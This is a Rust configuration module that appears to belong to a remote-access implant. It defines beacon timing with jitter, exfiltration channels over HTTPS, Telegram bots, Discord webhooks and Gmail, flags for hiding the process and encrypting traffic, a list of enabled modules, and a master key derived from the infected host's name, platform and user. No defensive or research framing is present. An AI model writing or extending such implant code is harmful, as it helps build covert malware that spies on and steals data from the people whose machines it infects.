use std::env;
use ring::digest::{Context, SHA256};
use base64::Engine;
use serde::{Deserialize, Serialize};

#[derive(Deserialize, Serialize)]
pub struct BeaconConfig {
    pub interval: u64,
    pub jitter: f64,
}

#[derive(Deserialize, Serialize)]
pub struct HttpsConfig {
    pub host: String,
    pub port: u16,
    pub path: String,
}

#[derive(Deserialize, Serialize)]
pub struct TelegramConfig {
    pub bot_token: String,
    pub chat_id: String,
}

#[derive(Deserialize, Serialize)]
pub struct DiscordConfig {
    pub webhook_url: String,
}

#[derive(Deserialize, Serialize)]
pub struct GmailConfig {
    pub email: String,
    pub app_password: String,
}

#[derive(Deserialize, Serialize)]
pub struct CommunicationConfig {
    pub https: HttpsConfig,
    pub telegram: TelegramConfig,
    pub discord: DiscordConfig,
    pub gmail: GmailConfig,
}

#[derive(Deserialize, Serialize)]
pub struct SecurityConfig {
    pub encrypt_comms: bool,
    pub compress_data: bool,
    pub hide_process: bool,
}

#[derive(Deserialize, Serialize)]
pub struct ModulesConfig {
    pub enabled: Vec<String>,
}

#[derive(Deserialize, Serialize)]
pub struct Config {
    pub beacon: BeaconConfig,
    pub communication: CommunicationConfig,
    pub security: SecurityConfig,
    pub modules: ModulesConfig,
}

impl Config {
    pub fn load() -> Result<Self, Box<dyn std::error::Error>> {
        let content = std::fs::read_to_string("config.toml")?;
        let config: Config = toml::from_str(&content)?;
        Ok(config)
    }

    #[allow(dead_code)]
    pub fn master_key() -> Vec<u8> {
        if let Ok(key) = env::var("MASTER_KEY") {
            return base64::engine::general_purpose::STANDARD.decode(&key).unwrap_or_default();
        }

        let mut context = Context::new(&SHA256);
        context.update(whoami::fallible::hostname().unwrap_or("unknown".to_string()).as_bytes());
        context.update(whoami::platform().to_string().as_bytes());
        context.update(whoami::username().as_bytes());
        context.finish().as_ref().to_vec()
    }
}